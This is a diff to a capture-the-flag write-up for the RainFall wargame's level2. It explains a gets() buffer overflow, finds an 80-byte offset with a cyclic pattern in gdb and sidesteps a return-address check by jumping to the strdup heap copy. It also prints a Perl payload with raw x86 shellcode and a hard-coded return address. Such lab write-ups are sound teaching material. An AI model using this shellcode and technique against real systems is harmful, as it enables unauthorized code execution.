@@ -37,20 +37,10 @@ level2@RainFall:~$ ./level2 < ~/level2
 Segmentation fault (core dumped)
 level2@RainFall:~$
 
-Let's try to crash it with a manual input :
+Ok like previous exercise we have a call to gets function.
+We know gets have a vulnerability to overflow.
 
-level2@RainFall:~$ python -c 'print "A" * 100'
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAA
-level2@RainFall:~$ ./level2
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAA
-Segmentation fault (core dumped)
-level2@RainFall:~$
-
-We deduce that the overflow is happening at 80 bytes.
+<+25>:	call   0x80483c0 <gets@plt>
 
 Let's open gdb to get more information :
 
@@ -101,12 +91,42 @@ Dump of assembler code for function p:
    0x0804853e <+106>:	ret
 End of assembler dump.
 
+The program has a security and checks the return address to gets
+if is start to 0xb*******.
+<+39>:	and    $0xb0000000,%eax
+<+44>:	cmp    $0xb0000000,%eax
 
-level2@RainFall:~$ objdump -M intel -d level2 | grep "call.*eax"
- 8048488:	ff 14 85 50 97 04 08 	call   DWORD PTR [eax*4+0x8049750]
- 80484cf:	ff d0                	call   eax
- 80485eb:	ff d0                	call   eax
+The goal of the exploit is to change the return address and redirect it to malicious code.
+But how ? Since there is a protection to check the return address.
+If we do something in the stack the return address will pass the condition and exit. We of course
+want to avoid that.
 
+In our case we will exploit the strdup which calls malloc.
+
+So we can check this, by putting a breakpoint at return of main funtion.
+
+(gdb) b * main + 12
+Breakpoint 1 at 0x804854b
+(gdb) r
+Hello World!
+Hello World!
+(gdb) x/s $eax
+0x804a008:	 "Hello World!"
+
+We can see the return adress points to gets string.
+
+Ok, so we can fill the buffer with shellcode and random char and overwrite the eip adress
+with the return adress of strdup.
+
+We need size of buffer, same practise of last exercise. 
+Send a long string: 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+0x37634136 = 37 63 41 36 = (in ascii) 7 c A 6, is in little Endian so if i reverse this 6Ac7
+In my long string '6Ac7' Start at the 80th character
 
  Buffer start
       | ---------- Shellcode (n bytes) --------- |
@@ -123,7 +143,6 @@ $SHELLCODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31
 $XC = "\xCC"x(80-55-4) ."\xeb\x85\x04\x08";
 
 print $NOP x 4 . $SHELLCODE . $XC;
-
 
 And execute it : 
 
